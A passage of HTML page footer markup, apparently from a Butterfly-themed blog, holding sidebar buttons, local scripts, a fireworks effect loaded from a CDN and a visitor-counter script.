fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
